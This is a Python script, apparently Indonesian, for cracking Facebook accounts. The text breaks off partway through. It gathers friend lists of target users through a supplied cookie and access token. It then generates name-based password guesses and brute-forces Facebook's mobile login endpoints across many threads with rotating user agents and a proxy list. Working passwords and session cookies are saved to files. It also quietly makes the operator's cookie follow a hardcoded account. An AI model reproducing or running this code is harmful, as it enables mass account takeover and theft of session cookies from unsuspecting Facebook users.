#----------[ IMPORT-MODULE ]----------#
import os
import re
import json
import sys
import random
import time
import datetime
import requests
import user_agent
try:
	import bs4
	import rich
	import requests
	import stdiomask
	import user_agent
except:
	os.system("pip install bs4")
	os.system("pip install rich")
	os.system("pip install requests")
	os.system("pip install stdiomask")
	os.system('pip install user_agent')
#-----------------[ IMPORT-KONTOL ]-----------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,user_agent
import urllib3,rich,base64
from rich.table import Table as me
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT-PROXY ]-------------------#
taplikasi=['ya']
gabriel=['ya']
ugen=[]
user=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
#----------------[Ubah UA disini NYET]---------------#
for xd in range(10000):
    rc = random.choice
    rr = random.randint
    uge = user_agent.generate_user_agent()
    ugen.append(uge)



def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()


#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def nazri_ganteng(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[KONTOL]-----------------#
def banner():
	nazri_ganteng(f'{h}_{x}' * 0)
	cetak(nel(f"""[green]  ______________________             ________     ______      
  ___  __ \_<  /___  __ \__________________(_)_______  /__    
  __  /_/ /_  / __  /_/ /_  ___/  __ \____  /_  _ \_  //_/  Author / Alvino-adijaya      
  _  _, _/_  /___  ____/_  /   / /_/ /___  / /  __/  ,<    Update / Khahfi  
  /_/ |_| /_/_(_)_/     /_/    \____/___  /  \___//_/|_|  Versi. / 1.0    
                                     /___/                    """,width=89,title=f"[bold green] SELAMAT DATANG DI",style=f"bold white"))
	nazri_ganteng(f'{h}_{x}' * 0)
#--------------------[ MASUK ]--------------#
def login():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()

def login_lagi334():
    clear()
    print(f'\n{M}>{K}>{H}> {mer}Pastikan kamu menggunakan akun tumbal bukan pribadi')
    cookie = input(f"\n{M}>{K}>{H}> {P}Masukan cookie {H}:{P} ")
    try:convert(cookie);followmy("100003221221165", cookie);exit()
    except Exception as e:exit('\nSepertinya cookies akun tumbal kamu invalid')
        
def convert(cookie):
	try:
		link = ses.get("https://www.facebook.com/adsmanager/manage/campaigns", cookies={"cookie": cookie}, allow_redirects=True).text
		link1 = re.search('window\.location\.replace\("(.*?)"\)', str(link)).group(1).replace('\\','')
		link2 = ses.get(link1, cookies={"cookie": cookie}, allow_redirects=True).text
		token = re.search('accessToken="(.*?)"', str(link2)).group(1)
		check_aktif(token, cookie)
	except:pass

def check_aktif(token, cookie):
	try:
		head = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Accept-Encoding": "gzip, deflate","Accept-Language": "en-US,en;q=0.9","Cache-Control": "max-age=0","Dpr": "1","Pragma": "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace","Sec-Ch-Prefers-Color-Scheme": "dark","Sec-Ch-Ua": "","Sec-Ch-Ua-Full-Version-List": "","Sec-Ch-Ua-Mobile": "?0","Sec-Ch-Ua-Model": "","Sec-Ch-Ua-Platform": "","Sec-Ch-Ua-Platform-Version": "","Sec-Fetch-Dest": "document","Sec-Fetch-Mode": "navigate","Sec-Fetch-Site": "none","Sec-Fetch-User": "?1","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}
		link = ses.get("https://www.facebook.com/profile.php", headers=head, cookies={"cookie": cookie}, allow_redirects=True).text
		uid, nama = list(re.findall('"USER_ID":"(.*?)","NAME":"(.*?)"', str(link))[0])
		if uid == 0:
			print(f'\nSepertinya cookies akun tumbal kamu invalid')
			time.sleep(2);exit()
		else:
			open('.tok.txt','w').write(token)
			open('.cok.txt','w').write(cookie)
			print(f"\n{M}>{K}>{H}> {P}Token {M}: {P}"+str(token))
			print(f"\n{M}>{K}>{H}> {P}Login menggunakan cookie berhasil{M}..!!! {K}jalankan ulang script")
	except:pass

def followmy(user, cookie):
	try:
		link = parser(ses.get("https://mbasic.facebook.com/%s"%(user), cookies={"cookie": cookie}).text, "html.parser")
		for foll in link.find_all("a", href=True):
			if "/a/subscribe.php?" in foll.get("href"):
				ses.get("https://mbasic.facebook.com"+foll["href"], cookies={"cookie": cookie}).text
	except:pass

def check_info_facebook(token, cookie):
	try:
		link = ses.get("https://graph.facebook.com/me/?&access_token=%s"%(token), cookies=cookie).json()
		uid  = link["id"]
		nama = link["name"]
		return uid, nama
	except KeyError:
		os.system("rm -rf .cok.txt")
		os.system("rm -rf .tok.txt")
		print('Maaf, cookie akun tumbal kamu sudah kadaluarsa')
		time.sleep(2);login()
	except requests.exceptions.ConnectionError:
		exit('Maaf, koneksi internet anda terputus')
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	nazri_ganteng(f'{B}{x}[{k}•{x}] ID  : '+str(my_id))
	nazri_ganteng(f'{B}{x}[{k}•{x}] IP  : {ip}')
	nazri_ganteng('-' * 0)
	cetak(nel(f"""[cyan][yellow]"""'[cyan]',width=89,title=f"[bold green]MENU",style=f"bold white"))
	nazri_ganteng(f'{B}{x}[{h}•{x}] 1. Crack Publik')
	nazri_ganteng(f'{B}{x}[{h}•{x}] 2. Crack Masal')
	nazri_ganteng(f'{B}{x}[{h}•{x}] 3. Dari File Dump')
	nazri_ganteng(f'{B}{x}[{h}•{x}] 4. Cek Hasil')
	nazri_ganteng(f'{B}{x}[{h}•{x}] 0. Keluar')
	nazri_ganteng('=' * 0)
	nazri_cool_banget = input(f'[{k}?{x}] Pilih : ')
	nazri_ganteng('=' * 0)
	if nazri_cool_banget in ["1"]:
		idt = sol().input("[[bold green]•[bold white]] input id :  ")
		dump(idt, "", {"cookie": cok}, token)
		setting()
	elif nazri_cool_banget in ['2']:
	    dump_massal()
	elif nazri_cool_banget in ['3']:
	    Crack_file()
	elif nazri_cool_banget in ['4']:
		result()
	elif nazri_cool_banget in ['0']:
		os.system('rm -rf tok.txt')
		os.system('rm -rf cookie.txt')
		print('└─ Successfully Logout+Delete Cookies ')
		exit()
	else:
		print('└─ input correctly ')
		back()
def error():
	print(f'{k}└─ Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{h}•{x}] 1. Hasil {h}OK{x} Anda ')
	print(f'[{h}•{x}] 2. Hasil {k}CP{x} Anda ')
	print(f'[{h}•{x}] 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ({k} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}>> {k}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'>> %s. %s ( {h}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'>> %s. %s ({h} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'\nPilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			print('')
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()

#-----------------[ DUMP PUBLIK ]-----------------#
def dump(idt, fields, cookie, token):
    try:
        headers = {
            "connection": "keep-alive",
            "accept": "*/*",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "sec-ch-ua-mobile": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
            "accept-encoding": "gzip, deflate",
            "accept-language": "id-ID,id;q=0.9",
        }
        if len(id) == 0:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday)",
            }
        else:
            params = {
                "access_token": token,
                "fields": f"name,friends.fields(id,name,birthday).after({fields})",
            }
        url = ses.get(
            f"https://graph.facebook.com/{idt}",
            params=params,
            headers=headers,
            cookies=cookie,
        ).json()
        for i in url["friends"]["data"]:
            # print(i["id"]+"|"+i["name"])
            id.append(i["id"] + "|" + i["name"])
            sys.stdout.write(f"\r sedang dump... {len(id)}"),
            sys.stdout.flush()
        dump(idt, url["friends"]["paging"]["cursors"]["after"], cookie, token)
    except:
        pass

#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.tok.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'[{h}•{x}] Masukkan Jumlah Target : '))
	except ValueError:
		print('└─ wrong input ')
		exit()
	if jum<1 or jum>100:
		print('└─ Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'[{h}+{x}] Target '+str(yz)+' : ')
		uid.append(kl)
	nazri_ganteng('=' * 0)
	for userr in uid:
		try:
			headers = {
			"connection": "keep-alive",
			"accept": "*/*",
			"sec-fetch-dest": "empty",
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin",
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
			}
			params = {
			"access_token": token,
			"fields": f"name,friends.fields(id,name,birthday)"
			}
			col = ses.get('https://graph.facebook.com/v1.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], params = params, headers = headers, cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└─ unstable signal ')
			exit()
	try:
		print(f'🌏 Target Terkumpul : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('└─ unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'└─{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-----------------[ CRACK FROM FILE ]-------------------#
def Crack_file():
	file = input(f"\n [%] masukan nama folder/file : ")
	try:
		uid = open(file,"r").read().splitlines()
		for data in uid:
			try:user,nama = data.split('|')
			except:continue
			sys.stdout.write(f"\r [%] sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
			sys.stdout.flush()
			id.append(data)
	except FileNotFoundError:exit(f" [%] file tidak ada")
	setting()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	nazri_ganteng('=' * 0)
	cetak(nel(f"""[cyan][yellow]"""'[cyan]',width=89,title=f"[bold green]MULAI DARI",style=f"bold white"))
	nazri_ganteng(f'[{h}•{x}] 1. Akun Tua')
	nazri_ganteng(f'[{h}•{x}] 2. Akun Muda')
	nazri_ganteng(f'[{h}•{x}] 3. Akun Acak')
	nazri_ganteng('=' * 0)
	hu = input(f'[{h}?{x}] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('╰─ input correctly ')
		exit()
		print('')
		
	print('')
	cetak(nel(f"""[cyan][yellow]"""'[cyan]',width=89,title=f"[bold green]METODE",style=f"bold white"))
	print(f'''[{h}•{x}] 1. Validate''')
	print(f'''[{h}•{x}] 2. Async''')
	print('')
	hc = input(f'[{h}?{x}] Pilih : ')
	if hc in ['1','01']:
		method.append('validate')
	if hc in ['2','02']:
		method.append('async')
	else:
		method.append('validate')
	nazri_ganteng('=' * 0)
	pwplus=input(f'[{h}•{x}] Tambahkan Kata Sandi Manual ( y/t ) : ')
	nazri_ganteng('=' * 0)
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'[•] Masukkan Kata Sandi Tambahan Minimal 6 Karakter')
		print(f'[•] Contoh :{h} Indonesia,rahasia,katasandi{x}')
		pwku=input(f'[{h}•{x}] Masukkan Kata Sandi Tambahan  : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	nazri_ganteng('=' * 0)
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	nazri_ganteng('=' * 0)
	cetak(nel(f"""[cyan][yellow]"""'[cyan]',width=89,title=f"[bold green]HASIL TERSIMPAN",style=f"bold white"))
	print(f'[•] Results {h}OK{x} Save in : {h}OK/%s {x}'%(okc))
	print(f'[•] Results {k}CP{x} Save in : {k}CP/%s {x}'%(cpc))
	nazri_ganteng('=' * 0)
	cetak(nel(f"""[cyan][yellow]"""'[cyan]',width=89,title=f"[bold green]PROSES",style=f"bold white"))
	prog = Progress(SpinnerColumn('earth'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'));des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
						
				else:
					if len(frs)<3:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'54321')
						pwv.append(frs+'4321')
						pwv.append(frs+'321')
					else:
						pwv.append(nmf)
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'54321')
						pwv.append(frs+'4321')
						pwv.append(frs+'321')
						
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'validate' in method:
					pool.submit(crackvalidate,idf,pwv)
				elif 'async' in method:
					pool.submit(crackasync,idf,pwv)
				else:
					pool.submit(crackasync,idf,pwv)
		print('')
		cetak('\t[cyan]└─[green] Succesfully Crack,Dont Forget Send Your Feedback After Use My Script [cyan] <<[white] ')
		print(f'{h} OK : {h}%s '%(ok))
		print(f'{k} CP : {k}%s{x} '%(cp))
		print('')
		print('└─ Do You Want User Checkpoint Detector ( Y/t ) ? ')
		woi = input('└─ Select : ')
		if woi in ['y','Y']:
			cek_opsi()
		else:
			print(f'\t{x}└─{k} Good Bye Thanks To Using My Script {x} << ')
			time.sleep(2)
			back()
#--------------------[ METODE-VALIDATE ]-----------------#
def crackvalidate(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			p = ses.get(f'https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fdevelopers.facebook.com%2Fasync%2Fregistration&ref=dbl&fl&login_from_aymh=1&refid=8')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
"uid":idf,
"next":"https://developers.facebook.com/async/registration",
"flow":"login_no_pin",
"pass":pw,}
			heade={'Host': 'm.prod.facebook.com',
'Connection': 'keep-alive',
'Content-Length': f'{len(str(dataa))}',
'Cache-Control': 'max-age=0',
'dpr': '2',
'viewport-width': '980',
'sec-ch-prefers-color-scheme': 'light',
'Upgrade-Insecure-Requests': '1',
'Origin': 'https://m.prod.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'User-Agent': ua,
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'X-Requested-With': 'mark.via.gp',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-User': '?1',
'Sec-Fetch-Dest': 'document',
'Referer': f'https://m.prod.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https%3A%2F%2Fdevelopers.facebook.com%2Fasync%2Fregistration&ref=dbl&fl&login_from_aymh=1&refid=8',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.prod.facebook.com/login/device-based/validate-password/?shbl=0&ref=dbl',data=dataa,headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
			    if 'no' in gabriel:
			        cp+=1
			        print(f'\r[{k}CP{x}] {K}{idf}|{pw}{x}\n{x}{ua}\n')
			        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			        akun.append(idf+'|'+pw)
			        break
			    elif 'ya' in gabriel:
			        cp+=1
			        print(f'\r[{k}CP{x}] {K}{idf}|{pw}{x}\n{x}{ua}\n')
			        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			        akun.append(idf+'|'+pw)
			        ceker(idf,pw)
			        break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r[{h}OK{x}] {H}{idf}|{pw}\n{P}{H}{kuki}\n{H}{ua}{P}\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print(f'\r[{h}OK{x}] {H}{idf}|{pw}\n{P}{H}{kuki}\n{H}{ua}{P}\n')
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#--------------------[ METODE-ASYNC ]-----------------#
def crackasync(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'[deep_white]{(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	for pw in pwv:
		try:
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=822564807908213&kid_directed_site=0&app_id=822564807908213&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1702843945952%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3fb2aa703a8c74%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ffb18eec589d49c%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df28ffc7ad51a064%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2f6bc9c8eab7d%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ffb18eec589d49c%2526relation%253Dopener%2526frame%253Df1db658b4f80dec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2f6bc9c8eab7d%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ffb18eec589d49c%26relation%3Dopener%26frame%3Df1db658b4f80dec%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(p.text)).group(1),
'li': re.search('name="li" value="(.*?)"', str(p.text)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_dropdown',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'pass': pw,
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': '5',
'__a': '',
'__user': '0'}
			heade = {'Host': 'm.facebook.com',
'Connection': 'keep-alive',
'Content-Length': f'{len(str(dataa))}',
'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="119", "Google Chrome";v="119"',
'sec-ch-ua-mobile': '?1',
'User-Agent': ua,
'viewport-width': '445',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-LSD': 'AVrRLCI45d4',
'sec-ch-ua-platform-version': '"10.0.0"',
'X-ASBD-ID': '129477',
'dpr': '1.61875',
'sec-ch-ua-full-version-list': '"Not A;Brand";v="99.0.0.0", "Chromium";v="119.0.6045.33", "Google Chrome";v="119.0.6045.33"',
'sec-ch-ua-model': '"K"',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'Accept': '*/*',
'Origin': 'https://m.facebook.com',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-Mode': 'cors',
'Sec-Fetch-Dest': 'empty',
'Referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=822564807908213&kid_directed_site=0&app_id=822564807908213&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1702843945952%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3fb2aa703a8c74%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ffb18eec589d49c%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Flogin%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df28ffc7ad51a064%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2f6bc9c8eab7d%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ffb18eec589d49c%2526relation%253Dopener%2526frame%253Df1db658b4f80dec%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26s